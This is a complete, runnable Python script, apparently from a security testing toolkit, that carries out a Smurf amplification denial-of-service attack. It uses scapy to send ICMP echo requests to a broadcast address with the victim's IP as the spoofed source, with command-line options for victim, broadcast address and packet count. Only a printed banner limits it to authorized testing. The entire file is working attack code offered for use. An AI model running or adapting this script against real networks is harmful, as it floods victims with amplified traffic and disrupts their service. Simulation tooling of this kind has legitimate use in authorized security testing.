#!/usr/bin/env python3
"""
Smurf Attack Simulation

Amplification attack that spoofs ICMP echo requests to broadcast addresses, causing all hosts
on the network to reply to the victim.

Author: Montimage
License: Proprietary
Version: 1.0.0
"""

import os, sys, time, argparse, ipaddress
from typing import Dict, Any

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))
try:
    from logger import get_logger
except ImportError:
    import logging
    def get_logger(name):
        logger = logging.getLogger(name)
        if not logger.handlers:
            handler = logging.StreamHandler()
            formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
            handler.setFormatter(formatter)
            logger.addHandler(handler)
            logger.setLevel(logging.INFO)
        return logger

logger = get_logger(__name__)

try:
    from scapy.all import IP, ICMP, send, conf
except ImportError:
    logger.error("Requires scapy: pip install scapy")
    sys.exit(1)

conf.verb = 0


class SmurfAttack:
    """Smurf attack simulator."""

    def __init__(self, victim_ip: str, broadcast_ip: str, count: int = 100, verbose: bool = False):
        ipaddress.ip_address(victim_ip)
        ipaddress.ip_address(broadcast_ip)
        self.victim_ip = victim_ip
        self.broadcast_ip = broadcast_ip
        self.count = max(1, count)
        self.verbose = verbose
        self.packets_sent = 0
        conf.verb = 1 if verbose else 0
        logger.info(f"Initialized Smurf attack: victim={victim_ip}, broadcast={broadcast_ip}")

    def execute(self) -> Dict[str, Any]:
        """Execute the Smurf attack."""
        logger.info(f"Starting Smurf attack: sending {self.count} packets")
        start_time = time.time()

        try:
            for i in range(1, self.count + 1):
                packet = IP(src=self.victim_ip, dst=self.broadcast_ip)/ICMP()
                send(packet, verbose=0)
                self.packets_sent += 1

                if i % (self.count // 10 or 1) == 0:
                    logger.info(f"Progress: {i}/{self.count} packets")

            logger.info("Smurf attack completed")
        except KeyboardInterrupt:
            logger.warning("Interrupted")
        except Exception as e:
            logger.error(f"Error: {e}")
        finally:
            duration = time.time() - start_time
            stats = {"packets_sent": self.packets_sent, "duration_seconds": duration}
            logger.info(f"Sent {stats['packets_sent']} packets in {stats['duration_seconds']:.2f}s")
            return stats


def parse_arguments() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description="Smurf Attack Simulation")
    parser.add_argument("-v", "--victim", required=True, help="Victim IP address")
    parser.add_argument("-b", "--broadcast", required=True, help="Broadcast IP address")
    parser.add_argument("-c", "--count", type=int, default=100, help="Number of packets")
    parser.add_argument("--verbose", action="store_true", help="Verbose output")
    return parser.parse_args()


def main():
    print("=" * 80)
    print("WARNING: For AUTHORIZED SECURITY TESTING ONLY")
    print("=" * 80)
    try:
        args = parse_arguments()
        attack = SmurfAttack(args.victim, args.broadcast, args.count, args.verbose)
        attack.execute()
    except KeyboardInterrupt:
        sys.exit(0)
    except Exception as e:
        logger.error(f"Error: {e}")
        sys.exit(1)


if __name__ == "__main__":
    main()
